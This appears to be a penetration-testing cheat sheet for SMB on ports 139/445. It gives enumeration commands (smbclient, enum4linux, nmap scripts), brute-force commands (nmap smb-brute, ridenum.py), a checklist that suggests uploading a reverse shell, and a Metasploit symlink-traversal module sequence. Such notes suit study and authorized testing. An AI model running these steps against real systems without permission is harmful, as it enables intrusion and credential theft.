# 139/445 - SMB

## Enumeration

### searchsploit

```bash
searchsploit <service info>  # Use searchsploit on nmap Service output details
```

### smbmap

```bash
smbmap -H <IP>
```

### smbclient

```bash
smbclient -L //<IP>  # List out available shares
smbclient //<IP>/<SHARE>  # Connect to an available share
```

### nbtscan

```bash
nbtscan <IP>
```

### enum4linux

```bash
enum4linux <IP>
```

### nmap

```bash
# /usr/share/nmap/scripts/smb*
nmap -p445 <IP> --script=smb-system-info
nmap -p445 <IP> --script=smb-enum*
nmap -p445 <IP> --script=smb-vuln*
```

### Metasploit

```bash
search smb
```

## Brute Force

```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusernam
```

## Exploitation Check

* [ ] Enumerate and download any interesting files ideally looking for credentials or other information relating to other services.
* [ ] Can you login via SMB and put files on the system?
  * [ ] If so, is there a web interface where you can access the files?
    * [ ] If so, then you may be able to upload a reverse shell.
  * [ ] If so, can you use Metasploit to create symbolic link to the root filesystem?

## Exploitation

### Metasploit

```bash
use auxiliary/admin/smb/samba_symlink_traversal
set rhost
set smbshare <SHARE>
exploit
```

Then back in `smbclient` we can `cd` into the `rootfs` that was created.
